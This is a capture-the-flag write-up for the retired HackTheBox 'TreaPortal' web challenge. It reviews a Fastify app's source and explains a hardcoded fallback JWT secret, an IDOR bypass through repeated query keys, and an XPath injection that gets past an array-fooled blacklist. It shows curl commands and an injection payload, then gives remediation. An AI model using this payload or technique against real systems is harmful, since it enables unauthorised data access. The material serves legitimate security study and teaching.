# TreaPortal — HackTheBox Challenge Write-up

| | |
|---|---|
| **Platform** | HackTheBox — Challenges |
| **Category** | Web / Forensics (Code Review) |
| **Difficulty** | Easy |
| **Stack** | Node.js, TypeScript, Fastify, XML (XPath) |

> ⚠️ **Spoiler notice:** This write-up is only published after the challenge has been retired on HackTheBox, per platform rules. If you're still attempting it, stop reading here.

## Scenario

> *"We migrated to a new stack, but somehow an attacker got access to our confidential data. Can you figure out how?"*

We're given the full source code of **TreaPortal**, a small Fastify + TypeScript web application, and asked to reconstruct how an attacker extracted confidential employee data after a recent backend migration.

## Recon — Source Layout

```
web_treaportal/
├── package.json
└── src/
    ├── index.ts
    ├── db/init.ts
    ├── middleware/auth.ts
    ├── routes/
    │   ├── auth.ts
    │   ├── user.ts
    │   └── dashboard.ts
    ├── services/userService.ts
    └── types/index.ts
```

The structure of a Fastify app with `register()`-ed route plugins and a dedicated `auth` middleware made `middleware/auth.ts` and the route handlers the obvious starting point for a broken-access-control or injection bug.

## Finding #1 — Weak JWT Fallback Secret

`middleware/auth.ts`:

```ts
fastify.register(jwt, {
    secret: process.env.JWT_SECRET ? process.env.JWT_SECRET : 'secret-password',
})
```

If `JWT_SECRET` isn't set in the deployment environment — plausible right after a migration — the app silently falls back to the hardcoded string `secret-password`. This alone would let an attacker forge arbitrary JWTs. It turned out not to be the path needed for this challenge, but it's a real finding worth flagging in any review of this codebase.

## Finding #2 — Broken Access Control in `/api/user`

`routes/user.ts`:

```ts
fastify.get('/', { preHandler: [fastify.authenticate] }, async (req, res) => {
    const { username } = req.query as any
    const tokenPayload = req.user as IJwtPayload

    // Temporarily restricted during migration.
    // TODO: reimplement with request schema validation
    if (typeof username === 'string' && username !== tokenPayload.username) {
        return res.status(403).send({ err: 'Access denied' })
    }

    const user = await getUserByUsername(username)
    ...
    return { username: user.username, email: user.email, salary: user.salary, role: user.role, flag: user.flag }
})
```

The comment is the smoking gun: this ownership check was a **temporary patch left in during the migration**, guarding only the `string` case of `username`. Fastify's default query parser turns a repeated query key (`?username=a&username=b`) into an **array**, not a string — so `typeof username === 'string'` evaluates to `false` and the entire ownership check is bypassed.

This is an **IDOR (Insecure Direct Object Reference)**: any authenticated user can request another user's full record — including the `flag` field — simply by sending `username` as an array instead of a string.

## Finding #3 — XPath Injection in the Data Layer

The "new stack" referenced in the scenario turned out to be literal: the backend stores users in an **XML file** (`db/users.xml`) and queries it with **XPath**, not SQL.

`services/userService.ts`:

```ts
function looksLikeXPathInjection(input: string): boolean {
    const blacklist = ["'", ';', 'or', 'and', ')', "(", "/" , "doc"];
    return blacklist.some(pattern => input.includes(pattern));
}

export async function getUserByUsername(username: any): Promise<IUser | null> {
    if (looksLikeXPathInjection(username)) throw new Error('bad')
    const doc = await getDoc()
    const node = xpath.select1(`//user[username='${username}']`, doc as any)
    return nodeToUser(node)
}
```

Two things stand out:

1. `username` is typed `any`, and the blacklist filter relies on `.includes()`. `String.prototype.includes()` checks for a **substring**; `Array.prototype.includes()` checks for an **exact element match**. Fed an array (as established in Finding #2), the blacklist can be trivially bypassed: `["' or '1'='1"].includes("'")` is `false`, because no *element* of the array equals the single character `'`.
2. The sanitized-looking value is then interpolated directly into an XPath expression — textbook **XPath Injection**.

### Parser gotcha

Fastify's default querystring parser does **not** support PHP-style `key[]=` syntax — that produces a literal key named `"username[]"`, leaving `username` itself `undefined` and crashing `looksLikeXPathInjection` on `undefined.includes(...)`. The correct way to produce an array under Fastify/Node's default parser is to **repeat the same key**:

```
?username=value1&username=value2
```

When an array like this is interpolated into the template string `` `//user[username='${username}']` ``, JavaScript's implicit `Array.toString()` joins the elements with commas — a detail the payload has to account for.

## Exploitation

**1. Register an account** (note the required `@trea.htb` email domain enforced in `validateForRegister`):

```bash
curl -s -X POST http://<target>:<port>/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@trea.htb","password":"Passw0rd123!"}'
```

**2. Capture the JWT** from the response and store it:

```bash
TOKEN="<jwt from previous step>"
```

**3. Trigger the IDOR + XPath injection** by sending `username` as a repeated (array) query parameter, with an injection payload crafted to account for the comma-joined array serialization:

```bash
curl -s -G "http://<target>:<port>/api/user/" \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "username=' or flag!='" \
  --data-urlencode "username="
```

This bypasses both the `typeof` ownership check (array, not string) and the XPath-injection blacklist (array `.includes()` ≠ substring check), and the resulting XPath expression returns a user record regardless of the requested username — including its `flag` field.

**4. Extract the flag** from the JSON response.

## Root Cause Summary

| Layer | Bug | Root Cause |
|---|---|---|
| `routes/user.ts` | IDOR | Ownership check only runs `if (typeof username === 'string')`, silently skipped for non-string input |
| `services/userService.ts` | XPath Injection | Injection blacklist uses `.includes()`, which behaves differently on `Array` vs `string`, combined with unsanitized string interpolation into an XPath query |
| Both | Type confusion | Query parameters typed `as any` instead of validated against a strict Fastify JSON schema |

Both bugs trace back to the same root cause called out directly in the code's own comment: a **temporary, incomplete fix applied during the migration**, written in a hurry and never properly validated with request schemas as the accompanying `TODO` acknowledged.

## Remediation

- Validate all route inputs with Fastify's built-in JSON Schema (`querystring` schema), rejecting anything that isn't a plain string of the expected shape — this alone would have prevented both bugs.
- Never interpolate user input directly into an XPath (or SQL) query string; use parameterized queries / safe XPath APIs, or escape input properly for the query language in use.
- Remove hardcoded fallback secrets (`'secret-password'`); fail startup if `JWT_SECRET` is unset.
- Enforce authorization checks consistently regardless of input type — check identity, not just the "stringness" of a field.

## Lessons Learned

- `typeof x === 'string'` is not a substitute for schema validation — array inputs via repeated query keys are an easy way to slip past type-narrowed checks.
- Blacklist-based injection filters are fragile, especially when the filtering function's behavior silently changes based on the input's runtime type (`Array.includes` vs `String.includes`).
- A rushed "temporary" fix during a migration, left behind with a `TODO`, is exactly the kind of gap real-world incident response investigations are built to catch.

---
